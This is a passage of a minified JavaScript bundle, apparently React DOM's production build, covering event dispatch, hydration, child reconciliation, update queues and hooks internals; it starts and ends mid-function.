e;if((y||h)&&(h=u.window===u?u:(h=u.ownerDocument)?h.defaultView||h.parentWindow:window,y?(k=t.relatedTarget||t.toElement,y=c,k=k?Xn(k):null,k!==null&&(L=ct(k),k!==L||k.tag!==5&&k.tag!==6)&&(k=null)):(y=null,k=c),y!==k)){if(x=Ro,S="onMouseLeave",p="onMouseEnter",f="mouse",(e==="pointerout"||e==="pointerover")&&(x=Mo,S="onPointerLeave",p="onPointerEnter",f="pointer"),L=y==null?h:yt(y),m=k==null?h:yt(k),h=new x(S,f+"leave",y,t,u),h.target=L,h.relatedTarget=m,S=null,Xn(u)===c&&(x=new x(p,f+"enter",k,t,u),x.target=m,x.relatedTarget=L,S=x),L=S,y&&k)n:{for(x=y,p=k,f=0,m=x;m;m=pt(m))f++;for(m=0,S=p;S;S=pt(S))m++;for(;0<f-m;)x=pt(x),f--;for(;0<m-f;)p=pt(p),m--;for(;f--;){if(x===p||p!==null&&x===p.alternate)break n;x=pt(x),p=pt(p)}x=null}else x=null;y!==null&&$o(d,h,y,x,!1),k!==null&&L!==null&&$o(d,L,k,x,!0)}}e:{if(h=c?yt(c):window,y=h.nodeName&&h.nodeName.toLowerCase(),y==="select"||y==="input"&&h.type==="file")var T=Af;else if(Do(h))if(Qu)T=Of;else{T=Nf;var v=Lf}else(y=h.nodeName)&&y.toLowerCase()==="input"&&(h.type==="checkbox"||h.type==="radio")&&(T=Rf);if(T&&(T=T(e,c))){Ku(d,T,t,u);break e}v&&v(e,h,c),e==="focusout"&&(v=h._wrapperState)&&v.controlled&&h.type==="number"&&da(h,"number",h.value)}switch(v=c?yt(c):window,e){case"focusin":(Do(v)||v.contentEditable==="true")&&(mt=v,_a=c,ds=null);break;case"focusout":ds=_a=mt=null;break;case"mousedown":Ea=!0;break;case"contextmenu":case"mouseup":case"dragend":Ea=!1,Ho(d,t,u);break;case"selectionchange":if(zf)break;case"keydown":case"keyup":Ho(d,t,u)}var b;if(Cl)e:{switch(e){case"compositionstart":var E="onCompositionStart";break e;case"compositionend":E="onCompositionEnd";break e;case"compositionupdate":E="onCompositionUpdate";break e}E=void 0}else ft?qu(e,t)&&(E="onCompositionEnd"):e==="keydown"&&t.keyCode===229&&(E="onCompositionStart");E&&(Yu&&t.locale!=="ko"&&(ft||E!=="onCompositionStart"?E==="onCompositionEnd"&&ft&&(b=Gu()):(Cn=u,_l="value"in Cn?Cn.value:Cn.textContent,ft=!0)),v=Br(c,E),0<v.length&&(E=new Oo(E,e,null,t,u),d.push({event:E,listeners:v}),b?E.data=b:(b=Xu(t),b!==null&&(E.data=b)))),(b=_f?Ef(e,t):Tf(e,t))&&(c=Br(c,"onBeforeInput"),0<c.length&&(u=new Oo("onBeforeInput","beforeinput",null,t,u),d.push({event:u,listeners:c}),u.data=b))}lp(d,n)})}function Ts(e,n,t){return{instance:e,listener:n,currentTarget:t}}function Br(e,n){for(var t=n+"Capture",s=[];e!==null;){var r=e,i=r.stateNode;r.tag===5&&i!==null&&(r=i,i=ws(e,t),i!=null&&s.unshift(Ts(e,i,r)),i=ws(e,n),i!=null&&s.push(Ts(e,i,r))),e=e.return}return s}function pt(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function $o(e,n,t,s,r){for(var i=n._reactName,a=[];t!==null&&t!==s;){var l=t,o=l.alternate,c=l.stateNode;if(o!==null&&o===s)break;l.tag===5&&c!==null&&(l=c,r?(o=ws(t,i),o!=null&&a.unshift(Ts(t,o,l))):r||(o=ws(t,i),o!=null&&a.push(Ts(t,o,l)))),t=t.return}a.length!==0&&e.push({event:n,listeners:a})}var Ff=/\r\n?/g,Uf=/\u0000|\uFFFD/g;function Go(e){return(typeof e=="string"?e:""+e).replace(Ff,`
`).replace(Uf,"")}function ir(e,n,t){if(n=Go(n),Go(e)!==n&&t)throw Error(A(425))}function Fr(){}var Ta=null,Ca=null;function Pa(e,n){return e==="textarea"||e==="noscript"||typeof n.children=="string"||typeof n.children=="number"||typeof n.dangerouslySetInnerHTML=="object"&&n.dangerouslySetInnerHTML!==null&&n.dangerouslySetInnerHTML.__html!=null}var Aa=typeof setTimeout=="function"?setTimeout:void 0,Hf=typeof clearTimeout=="function"?clearTimeout:void 0,Yo=typeof Promise=="function"?Promise:void 0,Vf=typeof queueMicrotask=="function"?queueMicrotask:typeof Yo<"u"?function(e){return Yo.resolve(null).then(e).catch(Wf)}:Aa;function Wf(e){setTimeout(function(){throw e})}function $i(e,n){var t=n,s=0;do{var r=t.nextSibling;if(e.removeChild(t),r&&r.nodeType===8)if(t=r.data,t==="/$"){if(s===0){e.removeChild(r),xs(n);return}s--}else t!=="$"&&t!=="$?"&&t!=="$!"||s++;t=r}while(t);xs(n)}function On(e){for(;e!=null;e=e.nextSibling){var n=e.nodeType;if(n===1||n===3)break;if(n===8){if(n=e.data,n==="$"||n==="$!"||n==="$?")break;if(n==="/$")return null}}return e}function qo(e){e=e.previousSibling;for(var n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="$"||t==="$!"||t==="$?"){if(n===0)return e;n--}else t==="/$"&&n++}e=e.previousSibling}return null}var Wt=Math.random().toString(36).slice(2),en="__reactFiber$"+Wt,Cs="__reactProps$"+Wt,fn="__reactContainer$"+Wt,La="__reactEvents$"+Wt,$f="__reactListeners$"+Wt,Gf="__reactHandles$"+Wt;function Xn(e){var n=e[en];if(n)return n;for(var t=e.parentNode;t;){if(n=t[fn]||t[en]){if(t=n.alternate,n.child!==null||t!==null&&t.child!==null)for(e=qo(e);e!==null;){if(t=e[en])return t;e=qo(e)}return n}e=t,t=e.parentNode}return null}function Vs(e){return e=e[en]||e[fn],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function yt(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(A(33))}function fi(e){return e[Cs]||null}var Na=[],vt=-1;function Hn(e){return{current:e}}function X(e){0>vt||(e.current=Na[vt],Na[vt]=null,vt--)}function Y(e,n){vt++,Na[vt]=e.current,e.current=n}var Fn={},ve=Hn(Fn),Te=Hn(!1),tt=Fn;function Mt(e,n){var t=e.type.contextTypes;if(!t)return Fn;var s=e.stateNode;if(s&&s.__reactInternalMemoizedUnmaskedChildContext===n)return s.__reactInternalMemoizedMaskedChildContext;var r={},i;for(i in t)r[i]=n[i];return s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=n,e.__reactInternalMemoizedMaskedChildContext=r),r}function Ce(e){return e=e.childContextTypes,e!=null}function Ur(){X(Te),X(ve)}function Xo(e,n,t){if(ve.current!==Fn)throw Error(A(168));Y(ve,n),Y(Te,t)}function cp(e,n,t){var s=e.stateNode;if(n=n.childContextTypes,typeof s.getChildContext!="function")return t;s=s.getChildContext();for(var r in s)if(!(r in n))throw Error(A(108,Ah(e)||"Unknown",r));return J({},t,s)}function Hr(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||Fn,tt=ve.current,Y(ve,e),Y(Te,Te.current),!0}function Ko(e,n,t){var s=e.stateNode;if(!s)throw Error(A(169));t?(e=cp(e,n,tt),s.__reactInternalMemoizedMergedChildContext=e,X(Te),X(ve),Y(ve,e)):X(Te),Y(Te,t)}var on=null,mi=!1,Gi=!1;function up(e){on===null?on=[e]:on.push(e)}function Yf(e){mi=!0,up(e)}function Vn(){if(!Gi&&on!==null){Gi=!0;var e=0,n=$;try{var t=on;for($=1;e<t.length;e++){var s=t[e];do s=s(!0);while(s!==null)}on=null,mi=!1}catch(r){throw on!==null&&(on=on.slice(e+1)),Iu(kl,Vn),r}finally{$=n,Gi=!1}}return null}var wt=[],kt=0,Vr=null,Wr=0,ze=[],De=0,st=null,cn=1,un="";function Yn(e,n){wt[kt++]=Wr,wt[kt++]=Vr,Vr=e,Wr=n}function pp(e,n,t){ze[De++]=cn,ze[De++]=un,ze[De++]=st,st=e;var s=cn;e=un;var r=32-qe(s)-1;s&=~(1<<r),t+=1;var i=32-qe(n)+r;if(30<i){var a=r-r%5;i=(s&(1<<a)-1).toString(32),s>>=a,r-=a,cn=1<<32-qe(n)+r|t<<r|s,un=i+e}else cn=1<<i|t<<r|s,un=e}function Al(e){e.return!==null&&(Yn(e,1),pp(e,1,0))}function Ll(e){for(;e===Vr;)Vr=wt[--kt],wt[kt]=null,Wr=wt[--kt],wt[kt]=null;for(;e===st;)st=ze[--De],ze[De]=null,un=ze[--De],ze[De]=null,cn=ze[--De],ze[De]=null}var Ne=null,Le=null,K=!1,Ge=null;function dp(e,n){var t=je(5,null,null,0);t.elementType="DELETED",t.stateNode=n,t.return=e,n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)}function Qo(e,n){switch(e.tag){case 5:var t=e.type;return n=n.nodeType!==1||t.toLowerCase()!==n.nodeName.toLowerCase()?null:n,n!==null?(e.stateNode=n,Ne=e,Le=On(n.firstChild),!0):!1;case 6:return n=e.pendingProps===""||n.nodeType!==3?null:n,n!==null?(e.stateNode=n,Ne=e,Le=null,!0):!1;case 13:return n=n.nodeType!==8?null:n,n!==null?(t=st!==null?{id:cn,overflow:un}:null,e.memoizedState={dehydrated:n,treeContext:t,retryLane:1073741824},t=je(18,null,null,0),t.stateNode=n,t.return=e,e.child=t,Ne=e,Le=null,!0):!1;default:return!1}}function Ra(e){return(e.mode&1)!==0&&(e.flags&128)===0}function Oa(e){if(K){var n=Le;if(n){var t=n;if(!Qo(e,n)){if(Ra(e))throw Error(A(418));n=On(t.nextSibling);var s=Ne;n&&Qo(e,n)?dp(s,t):(e.flags=e.flags&-4097|2,K=!1,Ne=e)}}else{if(Ra(e))throw Error(A(418));e.flags=e.flags&-4097|2,K=!1,Ne=e}}}function Zo(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;Ne=e}function ar(e){if(e!==Ne)return!1;if(!K)return Zo(e),K=!0,!1;var n;if((n=e.tag!==3)&&!(n=e.tag!==5)&&(n=e.type,n=n!=="head"&&n!=="body"&&!Pa(e.type,e.memoizedProps)),n&&(n=Le)){if(Ra(e))throw hp(),Error(A(418));for(;n;)dp(e,n),n=On(n.nextSibling)}if(Zo(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(A(317));e:{for(e=e.nextSibling,n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="/$"){if(n===0){Le=On(e.nextSibling);break e}n--}else t!=="$"&&t!=="$!"&&t!=="$?"||n++}e=e.nextSibling}Le=null}}else Le=Ne?On(e.stateNode.nextSibling):null;return!0}function hp(){for(var e=Le;e;)e=On(e.nextSibling)}function It(){Le=Ne=null,K=!1}function Nl(e){Ge===null?Ge=[e]:Ge.push(e)}var qf=vn.ReactCurrentBatchConfig;function Qt(e,n,t){if(e=t.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(t._owner){if(t=t._owner,t){if(t.tag!==1)throw Error(A(309));var s=t.stateNode}if(!s)throw Error(A(147,e));var r=s,i=""+e;return n!==null&&n.ref!==null&&typeof n.ref=="function"&&n.ref._stringRef===i?n.ref:(n=function(a){var l=r.refs;a===null?delete l[i]:l[i]=a},n._stringRef=i,n)}if(typeof e!="string")throw Error(A(284));if(!t._owner)throw Error(A(290,e))}return e}function lr(e,n){throw e=Object.prototype.toString.call(n),Error(A(31,e==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":e))}function Jo(e){var n=e._init;return n(e._payload)}function fp(e){function n(p,f){if(e){var m=p.deletions;m===null?(p.deletions=[f],p.flags|=16):m.push(f)}}function t(p,f){if(!e)return null;for(;f!==null;)n(p,f),f=f.sibling;return null}function s(p,f){for(p=new Map;f!==null;)f.key!==null?p.set(f.key,f):p.set(f.index,f),f=f.sibling;return p}function r(p,f){return p=Dn(p,f),p.index=0,p.sibling=null,p}function i(p,f,m){return p.index=m,e?(m=p.alternate,m!==null?(m=m.index,m<f?(p.flags|=2,f):m):(p.flags|=2,f)):(p.flags|=1048576,f)}function a(p){return e&&p.alternate===null&&(p.flags|=2),p}function l(p,f,m,S){return f===null||f.tag!==6?(f=Ji(m,p.mode,S),f.return=p,f):(f=r(f,m),f.return=p,f)}function o(p,f,m,S){var T=m.type;return T===ht?u(p,f,m.props.children,S,m.key):f!==null&&(f.elementType===T||typeof T=="object"&&T!==null&&T.$$typeof===bn&&Jo(T)===f.type)?(S=r(f,m.props),S.ref=Qt(p,f,m),S.return=p,S):(S=Cr(m.type,m.key,m.props,null,p.mode,S),S.ref=Qt(p,f,m),S.return=p,S)}function c(p,f,m,S){return f===null||f.tag!==4||f.stateNode.containerInfo!==m.containerInfo||f.stateNode.implementation!==m.implementation?(f=ea(m,p.mode,S),f.return=p,f):(f=r(f,m.children||[]),f.return=p,f)}function u(p,f,m,S,T){return f===null||f.tag!==7?(f=et(m,p.mode,S,T),f.return=p,f):(f=r(f,m),f.return=p,f)}function d(p,f,m){if(typeof f=="string"&&f!==""||typeof f=="number")return f=Ji(""+f,p.mode,m),f.return=p,f;if(typeof f=="object"&&f!==null){switch(f.$$typeof){case Ks:return m=Cr(f.type,f.key,f.props,null,p.mode,m),m.ref=Qt(p,null,f),m.return=p,m;case dt:return f=ea(f,p.mode,m),f.return=p,f;case bn:var S=f._init;return d(p,S(f._payload),m)}if(ss(f)||Gt(f))return f=et(f,p.mode,m,null),f.return=p,f;lr(p,f)}return null}function h(p,f,m,S){var T=f!==null?f.key:null;if(typeof m=="string"&&m!==""||typeof m=="number")return T!==null?null:l(p,f,""+m,S);if(typeof m=="object"&&m!==null){switch(m.$$typeof){case Ks:return m.key===T?o(p,f,m,S):null;case dt:return m.key===T?c(p,f,m,S):null;case bn:return T=m._init,h(p,f,T(m._payload),S)}if(ss(m)||Gt(m))return T!==null?null:u(p,f,m,S,null);lr(p,m)}return null}function y(p,f,m,S,T){if(typeof S=="string"&&S!==""||typeof S=="number")return p=p.get(m)||null,l(f,p,""+S,T);if(typeof S=="object"&&S!==null){switch(S.$$typeof){case Ks:return p=p.get(S.key===null?m:S.key)||null,o(f,p,S,T);case dt:return p=p.get(S.key===null?m:S.key)||null,c(f,p,S,T);case bn:var v=S._init;return y(p,f,m,v(S._payload),T)}if(ss(S)||Gt(S))return p=p.get(m)||null,u(f,p,S,T,null);lr(f,S)}return null}function k(p,f,m,S){for(var T=null,v=null,b=f,E=f=0,I=null;b!==null&&E<m.length;E++){b.index>E?(I=b,b=null):I=b.sibling;var M=h(p,b,m[E],S);if(M===null){b===null&&(b=I);break}e&&b&&M.alternate===null&&n(p,b),f=i(M,f,E),v===null?T=M:v.sibling=M,v=M,b=I}if(E===m.length)return t(p,b),K&&Yn(p,E),T;if(b===null){for(;E<m.length;E++)b=d(p,m[E],S),b!==null&&(f=i(b,f,E),v===null?T=b:v.sibling=b,v=b);return K&&Yn(p,E),T}for(b=s(p,b);E<m.length;E++)I=y(b,p,E,m[E],S),I!==null&&(e&&I.alternate!==null&&b.delete(I.key===null?E:I.key),f=i(I,f,E),v===null?T=I:v.sibling=I,v=I);return e&&b.forEach(function(j){return n(p,j)}),K&&Yn(p,E),T}function x(p,f,m,S){var T=Gt(m);if(typeof T!="function")throw Error(A(150));if(m=T.call(m),m==null)throw Error(A(151));for(var v=T=null,b=f,E=f=0,I=null,M=m.next();b!==null&&!M.done;E++,M=m.next()){b.index>E?(I=b,b=null):I=b.sibling;var j=h(p,b,M.value,S);if(j===null){b===null&&(b=I);break}e&&b&&j.alternate===null&&n(p,b),f=i(j,f,E),v===null?T=j:v.sibling=j,v=j,b=I}if(M.done)return t(p,b),K&&Yn(p,E),T;if(b===null){for(;!M.done;E++,M=m.next())M=d(p,M.value,S),M!==null&&(f=i(M,f,E),v===null?T=M:v.sibling=M,v=M);return K&&Yn(p,E),T}for(b=s(p,b);!M.done;E++,M=m.next())M=y(b,p,E,M.value,S),M!==null&&(e&&M.alternate!==null&&b.delete(M.key===null?E:M.key),f=i(M,f,E),v===null?T=M:v.sibling=M,v=M);return e&&b.forEach(function(G){return n(p,G)}),K&&Yn(p,E),T}function L(p,f,m,S){if(typeof m=="object"&&m!==null&&m.type===ht&&m.key===null&&(m=m.props.children),typeof m=="object"&&m!==null){switch(m.$$typeof){case Ks:e:{for(var T=m.key,v=f;v!==null;){if(v.key===T){if(T=m.type,T===ht){if(v.tag===7){t(p,v.sibling),f=r(v,m.props.children),f.return=p,p=f;break e}}else if(v.elementType===T||typeof T=="object"&&T!==null&&T.$$typeof===bn&&Jo(T)===v.type){t(p,v.sibling),f=r(v,m.props),f.ref=Qt(p,v,m),f.return=p,p=f;break e}t(p,v);break}else n(p,v);v=v.sibling}m.type===ht?(f=et(m.props.children,p.mode,S,m.key),f.return=p,p=f):(S=Cr(m.type,m.key,m.props,null,p.mode,S),S.ref=Qt(p,f,m),S.return=p,p=S)}return a(p);case dt:e:{for(v=m.key;f!==null;){if(f.key===v)if(f.tag===4&&f.stateNode.containerInfo===m.containerInfo&&f.stateNode.implementation===m.implementation){t(p,f.sibling),f=r(f,m.children||[]),f.return=p,p=f;break e}else{t(p,f);break}else n(p,f);f=f.sibling}f=ea(m,p.mode,S),f.return=p,p=f}return a(p);case bn:return v=m._init,L(p,f,v(m._payload),S)}if(ss(m))return k(p,f,m,S);if(Gt(m))return x(p,f,m,S);lr(p,m)}return typeof m=="string"&&m!==""||typeof m=="number"?(m=""+m,f!==null&&f.tag===6?(t(p,f.sibling),f=r(f,m),f.return=p,p=f):(t(p,f),f=Ji(m,p.mode,S),f.return=p,p=f),a(p)):t(p,f)}return L}var zt=fp(!0),mp=fp(!1),$r=Hn(null),Gr=null,bt=null,Rl=null;function Ol(){Rl=bt=Gr=null}function Ml(e){var n=$r.current;X($r),e._currentValue=n}function Ma(e,n,t){for(;e!==null;){var s=e.alternate;if((e.childLanes&n)!==n?(e.childLanes|=n,s!==null&&(s.childLanes|=n)):s!==null&&(s.childLanes&n)!==n&&(s.childLanes|=n),e===t)break;e=e.return}}function At(e,n){Gr=e,Rl=bt=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&n&&(_e=!0),e.firstContext=null)}function Fe(e){var n=e._currentValue;if(Rl!==e)if(e={context:e,memoizedValue:n,next:null},bt===null){if(Gr===null)throw Error(A(308));bt=e,Gr.dependencies={lanes:0,firstContext:e}}else bt=bt.next=e;return n}var Kn=null;function Il(e){Kn===null?Kn=[e]:Kn.push(e)}function gp(e,n,t,s){var r=n.interleaved;return r===null?(t.next=t,Il(n)):(t.next=r.next,r.next=t),n.interleaved=t,mn(e,s)}function mn(e,n){e.lanes|=n;var t=e.alternate;for(t!==null&&(t.lanes|=n),t=e,e=e.return;e!==null;)e.childLanes|=n,t=e.alternate,t!==null&&(t.childLanes|=n),t=e,e=e.return;return t.tag===3?t.stateNode:null}var xn=!1;function zl(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function yp(e,n){e=e.updateQueue,n.updateQueue===e&&(n.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function dn(e,n){return{eventTime:e,lane:n,tag:0,payload:null,callback:null,next:null}}function Mn(e,n,t){var s=e.updateQueue;if(s===null)return null;if(s=s.shared,H&2){var r=s.pending;return r===null?n.next=n:(n.next=r.next,r.next=n),s.pending=n,mn(e,t)}return r=s.interleaved,r===null?(n.next=n,Il(s)):(n.next=r.next,r.next=n),s.interleaved=n,mn(e,t)}function br(e,n,t){if(n=n.updateQueue,n!==null&&(n=n.shared,(t&4194240)!==0)){var s=n.lanes;s&=e.pendingLanes,t|=s,n.lanes=t,bl(e,t)}}function ec(e,n){var t=e.updateQueue,s=e.alternate;if(s!==null&&(s=s.updateQueue,t===s)){var r=null,i=null;if(t=t.firstBaseUpdate,t!==null){do{var a={eventTime:t.eventTime,lane:t.lane,tag:t.tag,payload:t.payload,callback:t.callback,next:null};i===null?r=i=a:i=i.next=a,t=t.next}while(t!==null);i===null?r=i=n:i=i.next=n}else r=i=n;t={baseState:s.baseState,firstBaseUpdate:r,lastBaseUpdate:i,shared:s.shared,effects:s.effects},e.updateQueue=t;return}e=t.lastBaseUpdate,e===null?t.firstBaseUpdate=n:e.next=n,t.lastBaseUpdate=n}function Yr(e,n,t,s){var r=e.updateQueue;xn=!1;var i=r.firstBaseUpdate,a=r.lastBaseUpdate,l=r.shared.pending;if(l!==null){r.shared.pending=null;var o=l,c=o.next;o.next=null,a===null?i=c:a.next=c,a=o;var u=e.alternate;u!==null&&(u=u.updateQueue,l=u.lastBaseUpdate,l!==a&&(l===null?u.firstBaseUpdate=c:l.next=c,u.lastBaseUpdate=o))}if(i!==null){var d=r.baseState;a=0,u=c=o=null,l=i;do{var h=l.lane,y=l.eventTime;if((s&h)===h){u!==null&&(u=u.next={eventTime:y,lane:0,tag:l.tag,payload:l.payload,callback:l.callback,next:null});e:{var k=e,x=l;switch(h=n,y=t,x.tag){case 1:if(k=x.payload,typeof k=="function"){d=k.call(y,d,h);break e}d=k;break e;case 3:k.flags=k.flags&-65537|128;case 0:if(k=x.payload,h=typeof k=="function"?k.call(y,d,h):k,h==null)break e;d=J({},d,h);break e;case 2:xn=!0}}l.callback!==null&&l.lane!==0&&(e.flags|=64,h=r.effects,h===null?r.effects=[l]:h.push(l))}else y={eventTime:y,lane:h,tag:l.tag,payload:l.payload,callback:l.callback,next:null},u===null?(c=u=y,o=d):u=u.next=y,a|=h;if(l=l.next,l===null){if(l=r.shared.pending,l===null)break;h=l,l=h.next,h.next=null,r.lastBaseUpdate=h,r.shared.pending=null}}while(!0);if(u===null&&(o=d),r.baseState=o,r.firstBaseUpdate=c,r.lastBaseUpdate=u,n=r.shared.interleaved,n!==null){r=n;do a|=r.lane,r=r.next;while(r!==n)}else i===null&&(r.shared.lanes=0);it|=a,e.lanes=a,e.memoizedState=d}}function nc(e,n,t){if(e=n.effects,n.effects=null,e!==null)for(n=0;n<e.length;n++){var s=e[n],r=s.callback;if(r!==null){if(s.callback=null,s=t,typeof r!="function")throw Error(A(191,r));r.call(s)}}}var Ws={},tn=Hn(Ws),Ps=Hn(Ws),As=Hn(Ws);function Qn(e){if(e===Ws)throw Error(A(174));return e}function Dl(e,n){switch(Y(As,n),Y(Ps,e),Y(tn,Ws),e=n.nodeType,e){case 9:case 11:n=(n=n.documentElement)?n.namespaceURI:fa(null,"");break;default:e=e===8?n.parentNode:n,n=e.namespaceURI||null,e=e.tagName,n=fa(n,e)}X(tn),Y(tn,n)}function Dt(){X(tn),X(Ps),X(As)}function vp(e){Qn(As.current);var n=Qn(tn.current),t=fa(n,e.type);n!==t&&(Y(Ps,e),Y(tn,t))}function jl(e){Ps.current===e&&(X(tn),X(Ps))}var Q=Hn(0);function qr(e){for(var n=e;n!==null;){if(n.tag===13){var t=n.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||t.data==="$?"||t.data==="$!"))return n}else if(n.tag===19&&n.memoizedProps.revealOrder!==void 0){if(n.flags&128)return n}else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return null;n=n.return}n.sibling.return=n.return,n=n.sibling}return null}var Yi=[];function Bl(){for(var e=0;e<Yi.length;e++)Yi[e]._workInProgressVersionPrimary=null;Yi.length=0}var xr=vn.ReactCurrentDispatcher,qi=vn.ReactCurrentBatchConfig,rt=0,Z=null,ae=null,ue=null,Xr=!1,hs=!1,Ls=0,Xf=0;function me(){throw Error(A(321))}function Fl(e,n){if(n===null)return!1;for(var t=0;t<n.length&&t<e.length;t++)if(!Ke(e[t],n[t]))return!1;return!0}function Ul(e,n,t,s,r,i){if(rt=i,Z=n,n.memoizedState=null,n.updateQueue=null,n.lanes=0,xr.current=e===null||e.memoizedState===null?Jf:em,e=t(s,r),hs){i=0;do{if(hs=!1,Ls=0,25<=i)throw Error(A(301));i+=1,ue=ae=null,n.updateQueue=null,xr.current=nm,e=t(s,r)}while(hs)}if(xr.current=Kr,n=ae!==null&&ae.next!==null,rt=0,ue=ae=Z=null,Xr=!1,n)throw Error(A(300));return e}function Hl(){var e=Ls!==0;return Ls=0,e}function Je(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return ue===null?Z.memoizedState=ue=e:ue=ue.next=e,ue}function Ue(){if(ae===null){var e=Z.alternate;e=e!==null?e.memoizedState:null}else e=ae.next;var n=ue===null?Z.memoizedState:ue.next;if(n!==null)ue=n,ae=e;else{if(e===null)throw Error(A(310));ae=e,e={memoizedState:ae.memoizedState,baseState:ae.baseState,baseQueue:ae.baseQueue,queue:ae.queue,next:null},ue===null?Z.memoizedState=ue=e:ue=ue.next=e}return ue}function Ns(e,n){return typeof n=="function"?n(e):n}function Xi(e){var n=Ue(),t=n.queue;if(t===null)throw Error(A(311));t.lastRenderedReducer=e;var s=ae,r=s.baseQueue,i=t.pending;if(i!==null){if(r!==null){var a=r.next;r.next=i.next,i.next=a}s.baseQueue=r=i,t.pending=null}if(r!==null){i=r.next,s=s.baseState;var l=a=null,o=null,c=i;do{var u=c.lane;if((rt&u)===u)o!==null&&(o=o.next={lane:0,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null}),s=c.hasEagerState?c.eagerState:e(s,c.action);else{var d={lane:u,action:c.action,hasEagerState:c.hasEagerState,eagerState:c.eagerState,next:null};o===null?(l=o=d,a=s):o=o.next=d,Z.lanes|=u,it|=u}c=c.next}while(c!==null&&c!==i);o===null?a=s:o.next=l,Ke(s,n.memoizedState)||(_e=!0),n.memoizedState=s,n.baseState=a,n.baseQueue=o,t.lastRenderedState=s}if(e=t.interleaved,e!==null){r=e;do i=r.lane,Z.lanes|=i,it|=i,r=r.next;while(r!==e)}else r===null&&(t.lanes=0);return[n.memoizedState,t.dispatch]}function Ki(e){var n=Ue(),t=n.queue;if(t===null)throw Error(A(311));t.lastRenderedReducer=e;var s=t.dispatch,r=t.pending,i=n.memoizedState;if(r!==null){t.pending=null;var a=r=r.next;do i=e(i,a.action),a=a.next;while(a!==r);Ke(i,n.memoizedState)||(_e=!0),n.memoizedState=i,n.baseQueue===null&&(n.baseState=i),t.lastRenderedState=i}return[i,s]}function wp(){}function kp(e,n){var t=Z,s=Ue(),r=n(),i=!Ke(s.memoizedState,r);if(i&&(s.memoizedState=r,_e=!0),s=s.queue,Vl(Sp.bind(null,t,s,e),[e]),s.getSnapshot!==n||i||ue!==null&&ue.memoizedState.tag&1){if(t.flags|=2048,Rs(9,xp.bind(null,t,s,r,n),void 0,null),pe===null)throw Error(A(349));rt&30||bp(t,n,r)}return r}function bp(e,n,t){e.flags|=16384,e={getSnapshot:n,value:t},n=Z.updateQueue,n===null?(n={lastEffect:null,stores:null},Z.updateQueue=n,n.stores=[e]):(t=n.stores,t===null?n.stores=[e]:t.push(e))}function xp(e,n,t,s){n.value=t,n.getSnapshot=s,_p(n)&&Ep(e)}function Sp(e,n,t){return t(function(){_p(n)&&Ep(e)})}function _p(e){var n=e.getSnapshot;e=e.value;try{var t=n();return!Ke(e,t)}catch{return!0}}function Ep(e){var n=mn(e,1);n!==null&&Xe(n,e,1,-1)}function tc(e){var n=Je();return typeof e=="function"&&(e=e()),n.memoizedState=n.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Ns,lastRenderedState:e},n.queue=e,e=e.dispatch=Zf.bind(null,Z,e),[n.memoizedState,e]}function Rs(e,n,t,s){return e={tag:e,create:n,destroy:t,deps:s,next:null},n=Z.updateQueue,n===null?(n={lastEffect:null,stores:null},Z.updateQueue=n,n.lastEffect=e.next=e):(t=n.lastEffect,t===null?n.lastEffect=e.next=e:(s=t.next,t.next=e,e.next=s,n.lastEffect=e)),e}function Tp(){return Ue().memoizedState}function Sr(e,n,t,s){var r=Je();Z.flags|=e,r.memoizedState=Rs(1|n,t,void 0,s===void 0?null:s)}function gi(e,n,t,s){var r=Ue();s=s===void 0?null:s;var i=void 0;if(ae!==null){var a=ae.memoizedState;if(i=a.destroy,s!==null&&Fl(s,a.deps)){r.memoizedState=Rs(n,t,i,s);return}}Z.flags|=e,r.memoizedState=Rs(1|n,t,i,s)}function sc(e,n){return Sr(8390656,8,e,n)}function Vl(e,n){return gi(2048,8,e,n)}function Cp(e,n){return gi(4,2,e,n)}function Pp(e,n){return gi(4,4,e,n)}function Ap(e,n){if(typeof n=="function")return e=e(),n(e),function(){n(null)};if(n!=null)return e=e(),n.current=e,function(){n.current=null}}function Lp(e,n,t){return t=t!=null?t.concat([e]):null,gi(4,4,Ap.bind(null,n,e),t)}function Wl(){}function Np(e,n){var t=Ue();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&Fl(n,s[1])?s[0]:(t.memoizedState=[e,n],e)}function Rp(e,n){var t=Ue();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&Fl(n,s[1])?s[0]:(e=e(),t.memoizedState=[e,n],e)}function Op(e,n,t){return rt&21?(Ke(t,n)||(t=ju(),Z.lanes|=t,it|=t,e.baseState=!0),n):(e.baseState&&(e.baseState=!1,_e=!0),e.memoizedState=t)}function Kf(e,n){var t=$;$=t!==0&&4>t?t:4,e(!0);var s=qi.transition;qi.transition={};try{e(!1),n()}finally{$=t,qi.transition=s}}function Mp(){return Ue().memoizedState}function Qf(e,n,t){var s=zn(e);if(t={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null},Ip(e))zp(n,t);else if(t=gp(e,n,t,s),t!==null){var r=ke();Xe(t,e,s,r),Dp(t,n,s)}}function Zf(e,n,t){var s=zn(e),r={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null};if(Ip(e))zp(n,r);else{var 